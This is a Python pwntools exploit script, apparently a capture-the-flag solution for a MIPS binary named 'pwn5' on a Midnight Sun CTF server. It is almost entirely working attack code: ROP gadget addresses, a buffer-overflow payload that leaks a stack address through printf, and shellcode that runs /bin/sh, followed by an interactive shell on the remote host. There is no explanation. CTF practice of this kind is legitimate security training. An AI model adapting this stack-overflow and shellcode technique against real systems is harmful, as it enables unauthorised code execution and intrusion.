#!/usr/bin/env python3
from pwn import *

context.arch = 'mips'

puts = 0x409190
percent_x = 0x47737c
printf = 0x4083c0
# lw $t9, 0x20($sp); jalr $t9; lw $a0, 0x24($sp);
a0_gadget = 0x459efc
# lw $t9, 0x34($sp); jalr $t9; lw $a1, 0x2c($sp);
a1_gadget = 0x470538
stack_addr = 0x4a3080
# 0x485d3e:	"%s'"
percent_s = 0x485d3e
# lw $ra, 4($sp); jr $t9;
ra_gadget = 0x421ab0

if False:
    shellcode = asm('''
li $v0, 4000+1
addiu $ra, 0x574
addiu $ra, 0x574
jr $ra
nop
''')
# http://shell-storm.org/shellcode/files/shellcode-782.php
shellcode = asm('''
    li $a2, 0x666
p:  bltzal $a2, p
    slti $a2, $zero, -1
    addu $sp, $sp, -32
    addu $a0, $ra, 4097
    addu $a0, $a0, -4049
    sw $a0, -24($sp)
    sw $zero, -20($sp)
    addu $a1, $sp, -24
    li $v0, 4011
    lui $ra, 0x0040
    addiu $ra, 0x574
    addiu $ra, 0x574
    jr $ra
    nop
sc:
    .byte 0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00
''')
print(shellcode.hex())
if b' ' in shellcode or b'\x0c' in shellcode:
    raise Exception()


def mk_io(debug=False):
    if args.LOCAL:
        cwd = os.path.join(os.path.dirname(__file__), 'pwn5')
        if debug:
            io = process(['qemu-mipsel-static', '-g', '12345', 'pwn5'], cwd=cwd)
            exe = os.path.join(cwd, 'pwn5')
            gdbscript = f'''
set pagination off
layout asm
#b *0x40076c
#b *0x400774
#b *0x400790
b *0x40079c
#b *0x4083c0
c
'''
            gdb.attach(('localhost', 12345), gdbscript=gdbscript, exe=exe)
        else:
            io = process(['qemu-mipsel-static', 'pwn5'], cwd=cwd)
    else:
        io = remote('pwn5-01.play.midnightsunctf.se', 10005)
    io.recvuntil('data:\n')
    return io


def get_stack_addr(io):
    buffer = flat({
        0x00: struct.pack('<I', 0),  # prevent hexdump
        0x44: struct.pack('<I', a0_gadget),
        0x44 + 0x4 + 0x20: a1_gadget,  # a0_gadget:t9
        0x44 + 0x4 + 0x24: percent_s,  # a0_gadget:a0
        0x44 + 0x4 + 0x34: printf,  # a1_gadget:t9
        0x44 + 0x4 + 0x2c: stack_addr,  # a1_gadget:a1
    })
    io.sendline(buffer)
    io.recvn(2)  # two '\n's from hexdump
    leak, = struct.unpack('<I', io.recvn(4))
    return leak


if args.LOCAL:
    exp_stack_addr = 0x7ffff568
else:
    exp_stack_addr = 0x7ffffda8
io = mk_io()
try:
    s = get_stack_addr(io)
    print(f'stack: 0x{s:08x}')
    assert s == exp_stack_addr
finally:
    io.close()
io = mk_io(debug=True)
buf_addr = s - 0x60
print(f'buf: 0x{buf_addr:08x}')
buffer = flat({
    0x00: shellcode,
    0x44: struct.pack('<I', buf_addr),
})
io.sendline(buffer)
io.interactive()
